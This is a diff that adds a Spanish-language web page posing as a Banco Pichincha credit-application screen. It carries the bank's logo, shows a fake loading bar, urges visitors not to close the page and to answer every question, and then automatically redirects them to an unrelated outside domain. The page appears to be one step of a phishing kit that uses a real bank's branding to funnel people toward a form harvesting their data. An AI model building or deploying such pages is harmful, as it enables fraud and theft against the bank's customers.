@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Espere un momento</title>
+    <style>
+        /* Variables de color de la marca */
+        :root {
+            --azul-marino: #0C2340;
+            --amarillo: #FFD100;
+            --blanco: #FFFFFF;
+            --gris-claro: #F4F6F8;
+            --texto-suave: #4A5568;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--gris-claro);
+            color: var(--azul-marino);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Encabezado con Logo */
+        header {
+            width: 100%;
+            padding: 20px 0;
+            background-color: var(--blanco);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo {
+            max-height: 50px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* Contenido Principal (Tarjeta) */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .card {
+            background-color: var(--blanco);
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(12, 35, 64, 0.08);
+            border-top: 5px solid var(--amarillo);
+            padding: 40px 30px;
+            max-width: 550px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .title {
+            color: var(--azul-marino);
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .subtitle {
+            color: var(--texto-suave);
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .highlight {
+            color: var(--azul-marino);
+            font-weight: 600;
+        }
+
+        /* Sección de Carga */
+        .progress-container {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 10px;
+            background-color: #E2E8F0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background-color: var(--amarillo);
+            border-radius: 5px;
+            transition: width 0.02s linear;
+        }
+
+        .progress-text {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--azul-marino);
+        }
+
+        /* Banner Inferior */
+        footer {
+            width: 100%;
+            padding: 20px 0;
+            background-color: var(--blanco);
+            border-top: 1px solid #E2E8F0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .banner-img {
+            max-height: 40px;
+            width: auto;
+            opacity: 0.8;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Encabezado / Logo Principal -->
+    <header>
+        <img src="https://i.postimg.cc/02Q91TyY/Banco-Pichincha-nuevo.png" alt="Logo Empresa" class="logo">
+    </header>
+
+    <!-- Contenido Central -->
+    <main>
+        <div class="card">
+            <h1 class="title">Preparando su solicitud crediticia</h1>
+            <p class="subtitle">
+                No cierre, estamos preparando su solicitud crediticia. 
+                <span class="highlight">¡Recuerde responder todas sus preguntas, de lo contrario se puede afectar su solicitud!</span>
+            </p>
+
+            <!-- Barra de Carga -->
+            <div class="progress-container">
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="progressBar"></div>
+                </div>
+                <div class="progress-text">
+                    Cargando: <span id="progressPercentage">1%</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Banner Inferior -->
+    <footer>
+        <img src="https://i.postimg.cc/02Q91TyY/Banco-Pichincha-nuevo.png" alt="Banner Inferior" class="banner-img">
+    </footer>
+
+    <!-- Script de redirección y animación -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const progressBar = document.getElementById("progressBar");
+            const progressPercentage = document.getElementById("progressPercentage");
+            const targetUrl = "https://requestanality.zya.me/?i=1";
+            
+            const totalDuration = 5000; // 2 segundos
+            const intervalTime = 50; // Actualiza cada 20 ms
+            const totalSteps = totalDuration / intervalTime;
+            
+            let currentStep = 0;
+
+            const timer = setInterval(() => {
+                currentStep++;
+                
+                // Cálculo del porcentaje del 1% al 100%
+                let percentage = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
+                if (percentage < 1) percentage = 1;
+
+                // Actualizar barra y texto
+                progressBar.style.width = percentage + "%";
+                progressPercentage.textContent = percentage + "%";
+
+                // Finalizar y redireccionar
+                if (currentStep >= totalSteps) {
+                    clearInterval(timer);
+                    window.location.href = targetUrl;
+                }
+            }, intervalTime);
+        });
+    </script>
+</body>
+</html>
